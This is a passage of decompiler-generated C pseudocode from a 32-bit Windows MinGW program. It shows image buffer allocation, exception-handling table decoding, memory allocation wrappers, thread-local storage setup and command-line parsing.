    ppcVar1[5] = (code *)0x3;
    (**ppcVar1)(param_1);
  }
  puVar2 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x40);
  param_1[0x5f] = (int)puVar2;
  *puVar2 = &LAB_00415af4;
  if (*(char *)(param_1[99] + 8) == '\0') {
    puVar2[1] = &LAB_00415b90;
    iVar7 = param_1[0x15];
    if (0 < param_1[0x13]) {
      iVar9 = 0;
      do {
        uVar3 = (**(code **)(param_1[1] + 8))
                          (param_1,1,
                           (*(int *)(iVar7 + 0x1c) * param_1[0x41] * param_1[0x3f]) /
                           *(int *)(iVar7 + 8),param_1[0x40]);
        puVar2[iVar9 + 2] = uVar3;
        iVar9 = iVar9 + 1;
        iVar7 = iVar7 + 0x58;
      } while (iVar9 < param_1[0x13]);
    }
  }
  else {
    puVar2[1] = &LAB_00415d20;
    iVar7 = param_1[0x40];
    iVar9 = (**(code **)param_1[1])(param_1,1,param_1[0x13] * 5 * iVar7 * 4);
    iStack_44 = param_1[0x15];
    if (0 < param_1[0x13]) {
      iStack_40 = 0;
      do {
        puVar4 = (undefined *)
                 (**(code **)(param_1[1] + 8))
                           (param_1,1,
                            (*(int *)(iStack_44 + 0x1c) * param_1[0x41] * param_1[0x3f]) /
                            *(int *)(iStack_44 + 8),iVar7 * 3);
        puVar6 = (undefined *)(iVar7 * 4 + iVar9);
        puVar8 = puVar4;
        puVar10 = puVar6;
        for (iVar5 = iVar7 * 0xc; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar10 = *puVar8;
          puVar8 = puVar8 + 1;
          puVar10 = puVar10 + 1;
        }
        if (0 < iVar7) {
          iVar5 = 0;
          do {
            *(undefined4 *)(iVar9 + iVar5 * 4) = *(undefined4 *)(puVar4 + iVar5 * 4 + iVar7 * 8);
            *(undefined4 *)(iVar7 * 0x10 + iVar9 + iVar5 * 4) = *(undefined4 *)(puVar4 + iVar5 * 4);
            iVar5 = iVar5 + 1;
          } while (iVar5 != iVar7);
        }
        puVar2[iStack_40 + 2] = puVar6;
        iVar9 = iVar9 + iVar7 * 0x14;
        iStack_40 = iStack_40 + 1;
        iStack_44 = iStack_44 + 0x58;
      } while (iStack_40 < param_1[0x13]);
      return;
    }
  }
  return;
}



void __cdecl FUN_00417114(int *param_1,int *param_2,int param_3)

{
  int iVar1;
  int *piVar2;
  
  piVar2 = param_1;
  for (iVar1 = 0x100; iVar1 != 0; iVar1 = iVar1 + -1) {
    *(undefined *)piVar2 = 0;
    piVar2 = (int *)((int)piVar2 + 1);
  }
  *param_1 = (*(byte *)(*param_2 + param_3) - 0x80) * 0x40;
  return;
}



undefined4 FUN_0041ebb0(void)

{
  byte in_AL;
  byte bVar1;
  undefined4 uVar2;
  bool bVar3;
  
  if (in_AL != 0xff) {
    bVar1 = in_AL & 0x70;
    if (bVar1 == 0x20) {
      uVar2 = FUN_00421c90();
      return uVar2;
    }
    if (bVar1 < 0x21) {
      if (bVar1 == 0) {
        return 0;
      }
      bVar3 = bVar1 == 0x10;
    }
    else {
      if (bVar1 == 0x40) {
        uVar2 = FUN_00421c60();
        return uVar2;
      }
      if (bVar1 < 0x41) {
        if (bVar1 == 0x30) {
          uVar2 = FUN_00421c80();
          return uVar2;
        }
        goto LAB_0041ebe0;
      }
      bVar3 = bVar1 == 0x50;
    }
    if (!bVar3) {
LAB_0041ebe0:
                    // WARNING: Subroutine does not return
      abort();
    }
  }
  return 0;
}



undefined8 __fastcall FUN_0041ec30(undefined4 param_1,uint *param_2)

{
  byte bVar1;
  byte *in_EAX;
  byte bVar2;
  uint uVar3;
  byte *local_14;
  
  uVar3 = 0;
  bVar2 = 0;
  local_14 = in_EAX;
  do {
    bVar1 = *local_14;
    local_14 = local_14 + 1;
    uVar3 = uVar3 | (bVar1 & 0x7f) << (bVar2 & 0x1f);
    bVar2 = bVar2 + 7;
  } while ((char)bVar1 < '\0');
  *param_2 = uVar3;
  return CONCAT44(local_14,local_14);
}



byte * __fastcall FUN_0041ec80(undefined4 param_1,uint *param_2)

{
  byte bVar1;
  byte *in_EAX;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  byte *local_18;
  
  uVar4 = 0;
  uVar2 = 0;
  local_18 = in_EAX;
  do {
    uVar3 = uVar2 + 7;
    bVar1 = *local_18;
    local_18 = local_18 + 1;
    uVar4 = uVar4 | (bVar1 & 0x7f) << ((byte)uVar2 & 0x1f);
    uVar2 = uVar3;
  } while ((char)bVar1 < '\0');
  if ((uVar3 < 0x20) && ((bVar1 & 0x40) != 0)) {
    uVar4 = uVar4 | -1 << ((byte)uVar3 & 0x1f);
  }
  *param_2 = uVar4;
  return local_18;
}



undefined4 * __fastcall FUN_0041ecf0(undefined4 *param_1,int param_2,undefined4 *param_3)

{
  byte in_AL;
  undefined4 *puVar1;
  undefined8 uVar2;
  undefined4 *local_18;
  undefined4 *local_14;
  
  if (in_AL != 0x50) {
    switch(in_AL & 0xf) {
    case 0:
    case 3:
    case 0xb:
      local_18 = (undefined4 *)*param_1;
      puVar1 = param_1 + 1;
      break;
    case 1:
      uVar2 = FUN_0041ec30(param_1,(uint *)&local_14);
      puVar1 = (undefined4 *)uVar2;
      local_18 = local_14;
      break;
    case 2:
      local_18 = (undefined4 *)(uint)*(ushort *)param_1;
      puVar1 = (undefined4 *)((int)param_1 + 2);
      break;
    case 4:
    case 0xc:
      local_18 = (undefined4 *)*param_1;
      puVar1 = param_1 + 2;
      break;
    default:
                    // WARNING: Subroutine does not return
      abort();
    case 9:
      puVar1 = (undefined4 *)FUN_0041ec80(param_1,(uint *)&local_18);
      break;
    case 10:
      local_18 = (undefined4 *)(int)*(short *)param_1;
      puVar1 = (undefined4 *)((int)param_1 + 2);
    }
    if (local_18 != (undefined4 *)0x0) {
      if ((in_AL & 0x70) == 0x10) {
        local_18 = (undefined4 *)((int)local_18 + (int)param_1);
      }
      else {
        local_18 = (undefined4 *)((int)local_18 + param_2);
      }
      if ((char)in_AL < '\0') {
        local_18 = (undefined4 *)*local_18;
      }
    }
    *param_3 = local_18;
    return puVar1;
  }
  puVar1 = (undefined4 *)((int)param_1 + 3U & 0xfffffffc);
  *param_3 = *puVar1;
  return puVar1 + 1;
}



int __fastcall FUN_0041edc0(undefined4 *param_1,char *param_2)

{
  char cVar1;
  int in_EAX;
  undefined4 uVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 *extraout_ECX;
  undefined4 *extraout_ECX_00;
  undefined4 *extraout_ECX_01;
  char *pcVar5;
  undefined8 uVar6;
  uint local_14;
  
  uVar2 = 0;
  puVar4 = param_1;
  if (in_EAX != 0) {
    uVar2 = FUN_00421c60();
    puVar4 = extraout_ECX;
  }
  *param_1 = uVar2;
  if (*param_2 == -1) {
    param_1[1] = uVar2;
    cVar1 = param_2[1];
    pcVar5 = param_2 + 2;
    *(char *)(param_1 + 5) = cVar1;
  }
  else {
    iVar3 = FUN_0041ebb0();
    puVar4 = FUN_0041ecf0((undefined4 *)(param_2 + 1),iVar3,param_1 + 1);
    cVar1 = *(char *)puVar4;
    pcVar5 = (char *)((int)puVar4 + 1);
    *(char *)(param_1 + 5) = cVar1;
    puVar4 = extraout_ECX_00;
  }
  if (cVar1 == -1) {
    param_1[3] = 0;
  }
  else {
    uVar6 = FUN_0041ec30(puVar4,&local_14);
    pcVar5 = (char *)uVar6;
    param_1[3] = pcVar5 + local_14;
    puVar4 = extraout_ECX_01;
  }
  *(char *)((int)param_1 + 0x15) = *pcVar5;
  uVar6 = FUN_0041ec30(puVar4,&local_14);
  param_1[4] = (int)uVar6 + local_14;
  return (int)uVar6;
}



undefined4 __fastcall FUN_0041ee90(undefined4 param_1,int param_2)

{
  byte bVar1;
  int in_EAX;
  byte bVar2;
  int iVar3;
  undefined4 local_10;
  
  iVar3 = 0;
  bVar1 = *(byte *)(in_EAX + 0x14);
  if (bVar1 != 0xff) {
    iVar3 = 2;
    bVar2 = bVar1 & 7;
    if (bVar2 != 2) {
      if (bVar2 < 3) {
        iVar3 = 4;
        if ((bVar1 & 7) != 0) {
LAB_0041eebe:
                    // WARNING: Subroutine does not return
          abort();
        }
      }
      else {
        iVar3 = 4;
        if (bVar2 != 3) {
          if (bVar2 != 4) goto LAB_0041eebe;
          iVar3 = 8;
        }
      }
    }
  }
  FUN_0041ecf0((undefined4 *)(*(int *)(in_EAX + 0xc) - param_2 * iVar3),*(int *)(in_EAX + 8),
               &local_10);
  return local_10;
}



bool __fastcall FUN_0041ef10(undefined4 *param_1,int *param_2)

{
  char cVar1;
  int *in_EAX;
  undefined4 *local_14;
  
  local_14 = (undefined4 *)*param_1;
  cVar1 = (**(code **)(*param_2 + 8))(param_2);
  if (cVar1 != '\0') {
    local_14 = (undefined4 *)*local_14;
  }
  cVar1 = (**(code **)(*in_EAX + 0x10))();
  if (cVar1 != '\0') {
    *param_1 = local_14;
  }
  return cVar1 != '\0';
}



undefined4 __fastcall FUN_0041ef80(undefined4 param_1,int *param_2,undefined4 param_3)

{
  bool bVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 local_18;
  uint local_14;
  
  local_18 = param_1;
  do {
    FUN_0041ec30(param_3,&local_14);
    if (local_14 == 0) {
      return 0;
    }
    FUN_0041ee90(extraout_ECX,local_14);
    bVar1 = FUN_0041ef10(&local_18,param_2);
    param_3 = extraout_ECX_00;
  } while (!bVar1);
  return 1;
}



undefined ** FUN_0041f520(int param_1)

{
  int *piVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  undefined **ppuVar4;
  undefined **unaff_EBX;
  undefined *unaff_ESI;
  undefined **ppuStack_f0;
  LPVOID pvStack_e8;
  undefined4 uStack_e4;
  undefined *puStack_d0;
  undefined *puStack_cc;
  undefined ***pppuStack_c8;
  undefined *puStack_c4;
  undefined *puStack_c0;
  undefined **ppuStack_b4;
  undefined *puStack_b0;
  undefined *in_stack_ffffff60;
  int **local_80;
  int **local_7c;
  uint *local_78;
  undefined *local_74;
  undefined4 local_70;
  char *local_6c;
  undefined *local_68;
  undefined *local_64;
  uint *local_60;
  undefined4 local_5c;
  undefined *local_58;
  undefined4 local_44;
  undefined4 local_34 [6];
  uint local_1c [3];
  
  local_60 = local_1c;
  local_58 = &stack0xffffff54;
  local_68 = &DAT_0041efe0;
  local_64 = &DAT_00422e8c;
  local_5c = 0x41f5a0;
  puStack_b0 = (undefined *)0x41f55b;
  FUN_00421a50(&local_80);
  puStack_b0 = (undefined *)0x41f566;
  FUN_00421100((uint *)param_1);
  local_44 = *(undefined4 *)(param_1 + -0xc);
  local_7c = (int **)0x2;
  puStack_b0 = (undefined *)0x41f59c;
  FUN_00420980(*(undefined **)(param_1 + -0x28));
  local_78 = local_60;
  if (local_64 != (undefined *)0x1) {
    local_64 = (undefined *)0x0;
    puStack_b0 = (undefined *)0x41f5be;
    FUN_00421210();
    local_64 = (undefined *)0x0;
    puStack_b0 = (undefined *)0x41f5ca;
    FUN_00421210();
    local_64 = (undefined *)0xffffffff;
    puStack_b0 = (undefined *)0x41f5df;
    FUN_00422110((int)local_78);
  }
  FUN_00421100(local_78);
  piVar1 = (int *)FUN_00420e30();
  local_7c = (int **)*piVar1;
  local_64 = (undefined *)0x1;
  local_80 = local_7c + 0x14;
  FUN_0041edc0(local_34,local_6c);
  uVar2 = FUN_0041ef80(local_80,*local_7c,local_70);
  if ((char)uVar2 == '\0') {
    local_64 = (undefined *)0x1;
    uVar2 = FUN_0041ef80(0,(int *)&PTR_PTR_LAB_00427530,local_70);
    if ((char)uVar2 == '\0') goto LAB_0041f68f;
    puVar3 = (undefined4 *)FUN_00420b30(4);
    unaff_ESI = &LAB_004208a0;
    unaff_EBX = &PTR_PTR_LAB_00427530;
    *puVar3 = &PTR_LAB_00427764;
    in_stack_ffffff60 = &LAB_004208a0;
    FUN_00420a40((int)puVar3,&PTR_PTR_LAB_00427530,&LAB_004208a0);
  }
  FUN_00420ab0();
LAB_0041f68f:
  local_64 = (undefined *)0x1;
  FUN_00420900(local_74);
  pppuStack_c8 = &ppuStack_b4;
  puStack_c0 = &stack0xffffff00;
  puStack_d0 = &DAT_0041efe0;
  puStack_cc = &DAT_00422e9c;
  puStack_c4 = &DAT_0041f750;
  ppuStack_b4 = unaff_EBX;
  puStack_b0 = unaff_ESI;
  FUN_00421a50(&pvStack_e8);
  if (in_stack_ffffff60 == (undefined *)0x0) {
    in_stack_ffffff60 = (undefined *)0x1;
  }
  uStack_e4 = 1;
  while( true ) {
    ppuVar4 = (undefined **)malloc((size_t)in_stack_ffffff60);
    if (ppuVar4 != (undefined **)0x0) {
      FUN_00421b30(&pvStack_e8);
      return ppuVar4;
    }
    if (DAT_0042c190 == (code *)0x0) break;
    uStack_e4 = 1;
    (*DAT_0042c190)();
  }
  puVar3 = (undefined4 *)FUN_00420b30(4);
  *puVar3 = &PTR_LAB_00427794;
  uStack_e4 = 1;
  FUN_00420a40((int)puVar3,&PTR_PTR_LAB_00427548,&LAB_00421300);
  if (ppuStack_f0 != (undefined **)0x0) {
    free(ppuStack_f0);
  }
  return ppuStack_f0;
}



void * __cdecl FUN_0041f6b0(size_t param_1)

{
  void *pvVar1;
  undefined4 *puVar2;
  void *pvStack_4c;
  LPVOID local_44;
  undefined4 local_40;
  undefined *local_2c;
  undefined *local_28;
  undefined *local_24;
  undefined *local_20;
  undefined *local_1c;
  
  local_24 = &stack0xfffffff0;
  local_1c = &stack0xffffffa4;
  local_2c = &DAT_0041efe0;
  local_28 = &DAT_00422e9c;
  local_20 = &DAT_0041f750;
  FUN_00421a50(&local_44);
  if (param_1 == 0) {
    param_1 = 1;
  }
  local_40 = 1;
  while( true ) {
    pvVar1 = malloc(param_1);
    if (pvVar1 != (void *)0x0) {
      FUN_00421b30(&local_44);
      return pvVar1;
    }
    if (DAT_0042c190 == (code *)0x0) break;
    local_40 = 1;
    (*DAT_0042c190)();
  }
  puVar2 = (undefined4 *)FUN_00420b30(4);
  *puVar2 = &PTR_LAB_00427794;
  local_40 = 1;
  FUN_00420a40((int)puVar2,&PTR_PTR_LAB_00427548,&LAB_00421300);
  if (pvStack_4c != (void *)0x0) {
    free(pvStack_4c);
  }
  return pvStack_4c;
}



void __cdecl FUN_0041f7c0(void *param_1)

{
  if (param_1 != (void *)0x0) {
    free(param_1);
  }
  return;
}



void * __cdecl FUN_0041f7e0(size_t param_1)

{
  void *pvVar1;
  LPVOID local_44;
  undefined4 local_40;
  undefined *local_2c;
  undefined *local_28;
  undefined *local_24;
  undefined *local_20;
  undefined *local_1c;
  
  local_24 = &stack0xfffffff0;
  local_1c = &stack0xffffffa4;
  local_2c = &DAT_0041efe0;
  local_28 = &DAT_00422eb0;
  local_20 = &DAT_0041f848;
  FUN_00421a50(&local_44);
  local_40 = 1;
  pvVar1 = FUN_0041f6b0(param_1);
  FUN_00421b30(&local_44);
  return pvVar1;
}



void __cdecl FUN_0041f880(void *param_1)

{
  FUN_0041f7c0(param_1);
  return;
}



void __cdecl FUN_0041f890(undefined4 *param_1)

{
  *param_1 = &PTR_LAB_004277c4;
  return;
}



void __cdecl FUN_0041f8a0(undefined4 *param_1)

{
  *param_1 = &PTR_LAB_0042768c;
  FUN_0041f890(param_1);
  return;
}



undefined4 __cdecl FUN_0041f9d0(int param_1,int param_2)

{
  int iVar1;
  
  if ((param_2 != param_1) &&
     (iVar1 = strcmp(*(char **)(param_1 + 4),*(char **)(param_2 + 4)), iVar1 != 0)) {
    return 0;
  }
  return 1;
}



bool __cdecl FUN_00420430(int param_1,int param_2,undefined4 param_3,undefined4 *param_4)

{
  undefined4 uVar1;
  bool bVar2;
  
  uVar1 = FUN_0041f9d0(param_1,param_2);
  bVar2 = (char)uVar1 != '\0';
  if (bVar2) {
    param_4[3] = 8;
    param_4[1] = 6;
    *param_4 = param_3;
  }
  return bVar2;
}



void __cdecl FUN_00420840(undefined4 *param_1)

{
  *param_1 = &PTR_LAB_004277ac;
  return;
}



void FUN_00420900(undefined *param_1)

{
  LPVOID local_44;
  undefined4 local_40;
  undefined *local_2c;
  undefined *local_28;
  undefined *local_24;
  undefined *local_20;
  undefined *local_1c;
  
  local_24 = &stack0xfffffff0;
  local_1c = &stack0xffffffa4;
  local_2c = &DAT_0041efe0;
  local_28 = &DAT_00422ec4;
  local_20 = &LAB_00420947;
  FUN_00421a50(&local_44);
  local_40 = 1;
  (*(code *)param_1)();
                    // WARNING: Subroutine does not return
  abort();
}



undefined4 FUN_00420960(void)

{
  undefined4 uVar1;
  code *unaff_EBP;
  undefined4 uStack_1c;
  
  FUN_00420900((undefined *)*DAT_0042c200);
  (*unaff_EBP)();
  FUN_00420960();
  FUN_00420980((undefined *)*DAT_0042c220);
  uVar1 = *DAT_0042c200;
  *DAT_0042c200 = uStack_1c;
  return uVar1;
}



undefined4 __cdecl FUN_00420980(undefined *param_1)

{
  undefined4 uVar1;
  undefined4 uStack_14;
  
  (*(code *)param_1)();
  FUN_00420960();
  FUN_00420980((undefined *)*DAT_0042c220);
  uVar1 = *DAT_0042c200;
  *DAT_0042c200 = uStack_14;
  return uVar1;
}



void FUN_00420a40(int param_1,undefined4 param_2,undefined4 param_3)

{
  undefined4 *puVar1;
  uint **ppuVar2;
  uint *puVar3;
  
  *(undefined4 *)(param_1 + -0x50) = param_2;
  *(undefined4 *)(param_1 + -0x20) = 0x432b2b00;
  *(undefined4 *)(param_1 + -0x1c) = 0x474e5543;
  *(undefined4 *)(param_1 + -0x4c) = param_3;
  puVar1 = DAT_0042c220;
  *(undefined **)(param_1 + -0x18) = &DAT_004209f0;
  *(undefined4 *)(param_1 + -0x48) = *puVar1;
  *(undefined4 *)(param_1 + -0x44) = *DAT_0042c200;
  puVar1 = FUN_00420f00();
  puVar1[1] = puVar1[1] + 1;
  FUN_00421d30((uint *)(param_1 + -0x20));
  FUN_00421100((uint *)(param_1 + -0x20));
  FUN_00420960();
  ppuVar2 = (uint **)FUN_00420f00();
  puVar3 = *ppuVar2;
  if (puVar3 == (uint *)0x0) goto LAB_00420af6;
  if ((puVar3[0xd] ^ 0x474e5543 | puVar3[0xc] ^ 0x432b2b00) != 0) goto LAB_00420b00;
  puVar3[5] = -puVar3[5];
  do {
    puVar3 = puVar3 + 0xc;
    FUN_00422270(puVar3);
    FUN_00421100(puVar3);
LAB_00420af6:
    FUN_00420960();
LAB_00420b00:
    *ppuVar2 = (uint *)0x0;
  } while( true );
}



void FUN_00420ab0(void)

{
  uint **ppuVar1;
  uint *puVar2;
  
  ppuVar1 = (uint **)FUN_00420f00();
  puVar2 = *ppuVar1;
  if (puVar2 == (uint *)0x0) goto LAB_00420af6;
  if ((puVar2[0xd] ^ 0x474e5543 | puVar2[0xc] ^ 0x432b2b00) != 0) goto LAB_00420b00;
  puVar2[5] = -puVar2[5];
  do {
    puVar2 = puVar2 + 0xc;
    FUN_00422270(puVar2);
    FUN_00421100(puVar2);
LAB_00420af6:
    FUN_00420960();
LAB_00420b00:
    *ppuVar1 = (uint *)0x0;
  } while( true );
}



undefined * __cdecl FUN_00420b30(int param_1)

{
  uint uVar1;
  uint uVar2;
  uint extraout_ECX;
  undefined *local_48;
  LPVOID local_44;
  undefined4 local_40;
  undefined *local_2c;
  undefined *local_28;
  undefined *local_24;
  undefined *local_20;
  undefined *local_1c;
  
  local_24 = &stack0xfffffff0;
  local_1c = &stack0xffffffa4;
  local_2c = &DAT_0041efe0;
  local_28 = &DAT_00422ed4;
  local_20 = &LAB_00420c90;
  FUN_00421a50(&local_44);
  local_48 = (undefined *)malloc(param_1 + 0x50U);
  if (local_48 == (undefined *)0x0) {
    if (DAT_0042c1b0 != 0) {
      local_40 = 1;
      FUN_004224c0((int *)&DAT_004230a0,&LAB_00420b10);
      if (DAT_0042c1b0 != 0) {
        local_40 = 1;
        FUN_00422670((LONG *)&DAT_00428160);
      }
    }
    uVar2 = 0;
    uVar1 = DAT_00428150;
    if (param_1 + 0x50U < 0x201) {
      do {
        if ((uVar1 & 1) == 0) goto LAB_00420c10;
        uVar2 = uVar2 + 1;
        uVar1 = uVar1 >> 1;
      } while (uVar2 < 0x20);
    }
    while( true ) {
      if (DAT_0042c1b0 != 0) {
        local_40 = 1;
        FUN_004226d0((LONG *)&DAT_00428160);
      }
      if (local_48 != (undefined *)0x0) break;
      local_40 = 1;
      FUN_00420960();
      uVar2 = extraout_ECX;
LAB_00420c10:
      DAT_00428150 = DAT_00428150 | 1 << ((byte)uVar2 & 0x1f);
      local_48 = &DAT_00428170 + uVar2 * 0x200;
    }
  }
  memset(local_48,0,0x50);
  FUN_00421b30(&local_44);
  return local_48 + 0x50;
}



void FUN_00420de0(void)

{
  DWORD DVar1;
  int iVar2;
  
  DVar1 = TlsAlloc();
  if (DVar1 != 0xffffffff) {
    DAT_0042c170 = DVar1;
    iVar2 = FUN_004214b0();
    DAT_004230b0 = (uint)(iVar2 == 0);
    return;
  }
  DVar1 = GetLastError();
  DAT_004230b0 = (uint)(DVar1 == 0);
  return;
}



undefined * FUN_00420e30(void)

{
  DWORD dwTlsIndex;
  DWORD dwErrCode;
  undefined *local_48;
  LPVOID local_44;
  undefined4 local_40;
  undefined *local_2c;
  undefined *local_28;
  undefined *local_24;
  undefined *local_20;
  undefined *local_1c;
  
  local_24 = &stack0xfffffff0;
  local_1c = &stack0xffffff94;
  local_2c = &DAT_0041efe0;
  local_28 = &DAT_00422ef4;
  local_20 = &DAT_00420ed6;
  FUN_00421a50(&local_44);
  dwTlsIndex = DAT_0042c170;
  local_48 = &DAT_0042c180;
  if (DAT_004230b0 != 0) {
    local_40 = 1;
    dwErrCode = GetLastError();
    local_48 = (undefined *)TlsGetValue(dwTlsIndex);
    SetLastError(dwErrCode);
  }
  FUN_00421b30(&local_44);
  return local_48;
}



undefined4 * FUN_00420f00(void)

{
  DWORD dwErrCode;
  int iVar1;
  LONG LVar2;
  BOOL BVar3;
  DWORD DVar4;
  undefined4 *local_4c;
  undefined4 *local_48;
  LPVOID local_44;
  undefined4 local_40;
  undefined *local_2c;
  undefined *local_28;
  undefined *local_24;
  undefined *local_20;
  undefined *local_1c;
  
  local_24 = &stack0xfffffff0;
  local_1c = &stack0xffffff94;
  local_2c = &DAT_0041efe0;
  local_28 = &DAT_00422f04;
  local_20 = &DAT_00420fc0;
  FUN_00421a50(&local_44);
  local_48 = (undefined4 *)&DAT_0042c180;
  if (DAT_004230b0 != 0) {
    if (DAT_004230b0 < 0) {
      iVar1 = -1;
      if (DAT_0042c1b0 == 0) goto LAB_00420ffa;
      if (DAT_004230b4 != 0) goto LAB_00420ff8;
      local_40 = 1;
      LVar2 = InterlockedIncrement((LONG *)&DAT_004230b8);
      if (LVar2 == 0) goto LAB_004210c1;
      do {
        if (DAT_004230b4 != 0) goto LAB_00420ff8;
        local_40 = 1;
        Sleep(0);
      } while( true );
    }
    do {
      DVar4 = DAT_0042c170;
      local_40 = 1;
      dwErrCode = GetLastError();
      local_4c = (undefined4 *)TlsGetValue(DVar4);
      SetLastError(dwErrCode);
      if (local_4c != (undefined4 *)0x0) {
LAB_00420f96:
        local_48 = local_4c;
        break;
      }
      local_4c = (undefined4 *)malloc(8);
      if (local_4c != (undefined4 *)0x0) {
        BVar3 = TlsSetValue(DAT_0042c170,local_4c);
        DVar4 = 0;
        if (BVar3 == 0) {
          DVar4 = GetLastError();
        }
        if (DVar4 == 0) {
          *local_4c = 0;
          local_4c[1] = 0;
          goto LAB_00420f96;
        }
      }
      local_40 = 1;
      FUN_00420960();
LAB_004210c1:
      FUN_00420de0();
      DAT_004230b4 = 1;
LAB_00420ff8:
      iVar1 = 0;
LAB_00420ffa:
      if ((iVar1 != 0) || (DAT_004230b0 < 0)) {
        DAT_004230b0 = 0;
      }
      local_48 = (undefined4 *)&DAT_0042c180;
    } while (DAT_004230b0 != 0);
  }
  FUN_00421b30(&local_44);
  return local_48;
}



int ** __cdecl FUN_00421100(uint *param_1)

{
  uint *puVar1;
  uint uVar2;
  int *piVar3;
  uint **ppuVar4;
  int **ppiVar5;
  int **ppiVar6;
  undefined4 *puVar7;
  int iVar8;
  uint *puVar9;
  LPVOID local_44;
  undefined4 local_40;
  undefined4 local_34;
  int local_30;
  undefined *local_2c;
  undefined *local_28;
  undefined *local_24;
  undefined4 local_20;
  undefined *local_1c;
  
  local_24 = &stack0xfffffff0;
  local_1c = &stack0xffffffa4;
  local_2c = &DAT_0041efe0;
  local_28 = &DAT_00422f14;
  local_20 = 0x4211d7;
  FUN_00421a50(&local_44);
  ppuVar4 = (uint **)FUN_00420f00();
  puVar1 = *ppuVar4;
  puVar9 = param_1 + -0xc;
  if ((param_1[1] ^ 0x474e5543 | *param_1 ^ 0x432b2b00) == 0) {
    uVar2 = param_1[-7];
    if ((int)uVar2 < 0) {
      uVar2 = -uVar2;
    }
    else {
      ppuVar4[1] = (uint *)((int)ppuVar4[1] + -1);
    }
    param_1[-7] = uVar2 + 1;
    if (puVar9 != puVar1) {
      param_1[-8] = (uint)puVar1;
      *ppuVar4 = puVar9;
    }
    ppiVar6 = (int **)param_1[-2];
    FUN_00421b30(&local_44);
    return ppiVar6;
  }
  if (puVar1 == (uint *)0x0) {
    *ppuVar4 = puVar9;
    FUN_00421b30(&local_44);
    return (int **)0x0;
  }
  local_40 = 1;
  FUN_00420960();
  if (local_2c != (undefined *)0xffffffff) {
    local_34 = 0xffffffff;
    local_30 = FUN_00422110(local_30);
  }
  local_34 = 0xffffffff;
  FUN_0041f520(local_30);
  ppiVar5 = (int **)FUN_00420e30();
  piVar3 = *ppiVar5;
  ppiVar6 = ppiVar5;
  if (piVar3 != (int *)0x0) {
    ppiVar6 = (int **)(piVar3[0xc] ^ 0x432b2b00);
    if ((piVar3[0xd] ^ 0x474e5543U | (uint)ppiVar6) != 0) {
      *ppiVar5 = (int *)0x0;
LAB_00421266:
      ppiVar6 = (int **)FUN_004223a0((int)(piVar3 + 0xc));
      return ppiVar6;
    }
    iVar8 = piVar3[5];
    if (iVar8 < 0) {
      iVar8 = iVar8 + 1;
      if (iVar8 == 0) {
        ppiVar5[1] = (int *)((int)ppiVar5[1] + 1);
        ppiVar6 = (int **)piVar3[4];
        *ppiVar5 = (int *)ppiVar6;
      }
    }
    else {
      iVar8 = iVar8 + -1;
      if (iVar8 == 0) {
        *ppiVar5 = (int *)piVar3[4];
        goto LAB_00421266;
      }
      if (iVar8 < 0) {
        FUN_00420960();
        puVar7 = FUN_00420f00();
        return (int **)(uint)(puVar7[1] != 0);
      }
    }
    piVar3[5] = iVar8;
  }
  return ppiVar6;
}



int ** FUN_00421210(void)

{
  int *piVar1;
  int **ppiVar2;
  int **ppiVar3;
  undefined4 *puVar4;
  int iVar5;
  
  ppiVar2 = (int **)FUN_00420e30();
  piVar1 = *ppiVar2;
  ppiVar3 = ppiVar2;
  if (piVar1 != (int *)0x0) {
    ppiVar3 = (int **)(piVar1[0xc] ^ 0x432b2b00);
    if ((piVar1[0xd] ^ 0x474e5543U | (uint)ppiVar3) != 0) {
      *ppiVar2 = (int *)0x0;
LAB_00421266:
      ppiVar3 = (int **)FUN_004223a0((int)(piVar1 + 0xc));
      return ppiVar3;
    }
    iVar5 = piVar1[5];
    if (iVar5 < 0) {
      iVar5 = iVar5 + 1;
      if (iVar5 == 0) {
        ppiVar2[1] = (int *)((int)ppiVar2[1] + 1);
        ppiVar3 = (int **)piVar1[4];
        *ppiVar2 = (int *)ppiVar3;
      }
    }
    else {
      iVar5 = iVar5 + -1;
      if (iVar5 == 0) {
        *ppiVar2 = (int *)piVar1[4];
        goto LAB_00421266;
      }
      if (iVar5 < 0) {
        FUN_00420960();
        puVar4 = FUN_00420f00();
        return (int **)(uint)(puVar4[1] != 0);
      }
    }
    piVar1[5] = iVar5;
  }
  return ppiVar3;
}



void FUN_00421350(void)

{
  char *pcVar1;
  HMODULE pHVar2;
  char cVar3;
  char *pcVar4;
  bool bVar5;
  bool bVar6;
  _STARTUPINFOA local_5c;
  
  FUN_00421910();
  FUN_004215b0();
  pcVar1 = GetCommandLineA();
  GetStartupInfoA(&local_5c);
  if (pcVar1 != (LPSTR)0x0) {
    for (; cVar3 = *pcVar1, cVar3 == ' ' || cVar3 == '\t'; pcVar1 = pcVar1 + 1) {
    }
    if (cVar3 == '\"') {
      do {
        pcVar4 = pcVar1;
        pcVar1 = pcVar4 + 1;
        cVar3 = *pcVar1;
      } while (cVar3 != '\"' && cVar3 != '\0');
      if (cVar3 == '\"') {
        pcVar1 = pcVar4 + 2;
        cVar3 = *pcVar1;
      }
    }
    else if (cVar3 != ' ' && cVar3 != '\t') {
      do {
        if (cVar3 == '\0') break;
        pcVar1 = pcVar1 + 1;
        cVar3 = *pcVar1;
      } while (cVar3 != ' ' && cVar3 != '\t');
    }
    bVar6 = cVar3 == '\t';
    bVar5 = cVar3 == ' ';
    while ((bool)(bVar5 | bVar6)) {
      pcVar1 = pcVar1 + 1;
      bVar6 = *pcVar1 == ' ';
      bVar5 = *pcVar1 == '\t';
    }
  }
  pHVar2 = GetModuleHandleA((LPCSTR)0x0);
  FUN_004032f0(pHVar2);
  return;
}



void FUN_00421470(void)

{
  int *piVar1;
  
  for (piVar1 = &DAT_004277dc; piVar1 < &DAT_004277dc; piVar1 = piVar1 + 2) {
    *(int *)(piVar1[1] + 0x400000) = *(int *)(piVar1[1] + 0x400000) + *piVar1;
  }
  return;
}



void FUN_004214a0(void)

{
  return;
}



void FUN_004214b0(void)

{
  int *piVar1;
  int iVar2;
  
  _assert();
  _assert(&DAT_00427413,"c:/mnt/samo/mingw/msys/mthr_stub.c",0x2a);
  iVar2 = *(int *)PTR_PTR_FUN_004230e0;
  while (iVar2 != 0) {
    (**(code **)PTR_PTR_FUN_004230e0)();
    piVar1 = (int *)(PTR_PTR_FUN_004230e0 + 4);
